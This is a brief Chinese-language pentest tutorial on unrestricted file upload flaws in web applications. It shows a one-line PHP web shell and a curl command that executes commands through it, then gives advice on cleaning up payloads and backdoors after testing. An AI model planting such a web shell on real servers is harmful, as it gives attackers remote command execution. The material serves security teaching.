# Web 应用利用 - 无限制文件上传

某些 Web 应用程序允许用户上传文件，但如果对这些文件的验证不完善（例如未检查文件扩展名、内容和大小），攻击者就可以利用此功能上传恶意文件。这些文件可用于篡改网站、用恶意软件感染服务器，甚至完全远程控制服务器。

## 上传 Web Shell

如果 Web 应用程序允许我们上传文件并在之后能够访问这些文件，那么我们就可以上传所谓的“Web shell”。Web shell 是一个运行在 Web 服务器上的程序，能够读取并执行用户输入，就像我们通过 HTTP 协议与 Shell 交互一样。

一个简单的 Web shell 可以是如下的 PHP 脚本：

```php
<?php system($_GET['cmd']); ?>
```

如果我们创建包含上述内容的 `webshell.php` 文件并将其上传到目标系统，就可以使用 `cmd` GET 参数远程执行命令：

```bash
user@host:~$ curl http://{vulnerablewebsite}/uploads/webshell.php?cmd=id
```

**重要提示：** 在渗透测试期间，清除注入和上传到目标系统中的恶意 payload 及文件至关重要。

- 移除所有已上传/注入到目标系统的、包含潜在恶意 payload 的可执行文件和脚本。
- 移除所有已安装的后门（例如 Web shell）。
- 删除您创建的所有用于连接回受感染系统的用户帐户。

如果测试人员无法移除某个工件，则客户的主要联系人必须从测试人员处获得清理目标系统所需的所有信息。
